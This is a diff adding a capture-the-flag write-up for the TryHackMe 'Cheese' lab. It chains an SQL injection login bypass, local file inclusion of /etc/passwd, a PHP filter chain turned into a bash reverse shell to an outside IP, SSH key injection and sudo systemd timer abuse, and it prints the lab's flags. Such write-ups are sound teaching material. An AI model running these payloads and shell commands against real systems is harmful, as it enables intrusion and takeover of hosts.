@@ -1,0 +1,131 @@
+🧀 Cheese — TryHackMe Writeup
+Вот красиво оформленный write-up! Я исправил грамматику и добавил профессиональное форматирование:
+
+Cheese — TryHackMe
+Difficulty: Medium Author: [Your Name] Date: 2026-01-06
+
+🔍 Reconnaissance
+Port Scanning
+bash
+
+nmap -sC -sV -oN nmap.txt 10.48.182.222
+
+Port	Service
+22	SSH
+80	HTTP
+🌐 Web Exploitation
+SQL Injection — Authentication Bypass
+On the login page, I tested various SQL injection payloads using Burp Suite.
+The following payload successfully bypassed authentication:
+sql
+
+' || '1'='1'-- -
+✅ Result: Logged in as admin!
+
+Local File Inclusion (LFI)
+After authentication, I discovered an LFI vulnerability in the file parameter:
+
+/secret-script.php?file=../../../../etc/passwd
+
+LFI to RCE via PHP Filter Chain
+I leveraged the LFI vulnerability to achieve Remote Code Execution using PHP filter chains.
+Step 1: Clone the exploit tool
+bash
+
+git clone https://github.com/synacktiv/php_filter_chain_generatorcd php_filter_chain_generator
+Step 2: Generate the payload
+bash
+
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' > rce.txt
+Step 3: Execute reverse shell
+bash
+
+curl -G "http://10.48.182.222/secret-script.php" \  --data-urlencode "file=$(cat rce.txt)" \  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.48.87.10/4444 0>&1'"
+Step 4: Catch the shell
+bash
+
+nc -lvnp 4444
+✅ Result: Received a shell as www-data!
+
+👤 Privilege Escalation: www-data → comte
+SSH Key Injection
+I discovered that the .ssh directory of user comte was writable.
+Step 1: Generate SSH keys on my machine
+bash
+
+ssh-keygen -t rsa -f comte_key -N ""
+Step 2: Inject public key into authorized_keys
+bash
+
+echo "ssh-rsa AAAA...your_key..." >> /home/comte/.ssh/authorized_keys
+Step 3: Connect via SSH
+bash
+
+ssh -i comte_key comte@10.48.182.222
+🚩 User Flag
+bash
+
+cat /home/comte/user.txt
+
+THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
+
+👑 Privilege Escalation: comte → root
+Sudo Enumeration
+bash
+
+sudo -l
+Output:
+
+(ALL) NOPASSWD: /bin/systemctl daemon-reload(ALL) NOPASSWD: /bin/systemctl restart exploit.timer(ALL) NOPASSWD: /bin/systemctl start exploit.timer(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+Systemd Timer Exploitation
+I examined the existing timer configuration:
+bash
+
+cat /etc/systemd/system/exploit.timer
+ini
+
+[Unit]Description=Exploit Timer[Timer]OnBootSec=1sUnit=exploit.service[Install]WantedBy=timers.target
+The timer triggers exploit.service, which sets the SUID bit on /opt/xxd.
+Step 1: Reload and restart the timer
+bash
+
+sudo /bin/systemctl daemon-reloadsudo /bin/systemctl restart exploit.timer
+Step 2: Wait for execution
+bash
+
+sleep 3
+Step 3: Verify SUID bit
+bash
+
+ls -la /opt/xxd
+
+-rwsr-sr-x 1 root root 18712 Jan 6 09:17 /opt/xxd
+✅ The s bit indicates SUID is set — xxd now runs as root!
+Reading the Root Flag
+Since /opt/xxd has the SUID bit set, it executes with root privileges:
+bash
+
+/opt/xxd /root/root.txt | xxd -r
+🚩 Root Flag
+
+THM{dca75486094810807faf4b7b0a929b11e5e0167c}
+
+📊 Attack Chain Summary
+
+┌─────────────────┐│   Nmap Scan     │└────────┬────────┘         ▼┌─────────────────┐│  SQL Injection  │ ──► Authentication Bypass└────────┬────────┘         ▼┌─────────────────┐│      LFI        │ ──► Read /etc/passwd└────────┬────────┘         ▼┌─────────────────┐│ PHP Filter RCE  │ ──► Reverse Shell (www-data)└────────┬────────┘         ▼┌─────────────────┐│ SSH Key Inject  │ ──► User: comte└────────┬────────┘         ▼┌─────────────────┐│ Systemd Timer   │ ──► SUID on xxd└────────┬────────┘         ▼┌─────────────────┐│ SUID xxd Abuse  │ ──► Root Flag! 🎉└─────────────────┘
+
+🛠️ Tools Used
+* Nmap
+* Burp Suite
+* PHP Filter Chain Generator
+* Netcat
+* SSH
+
+📚 Key Takeaways
+1. SQL Injection can bypass authentication entirely
+2. LFI vulnerabilities can be escalated to RCE using PHP filter chains
+3. Writable .ssh directories allow for SSH key injection
+4. Systemd timers with sudo permissions can be abused for privilege escalation
+5. SUID binaries like xxd can read any file on the system
+
+Rooted! 🧀🏴‍☠️
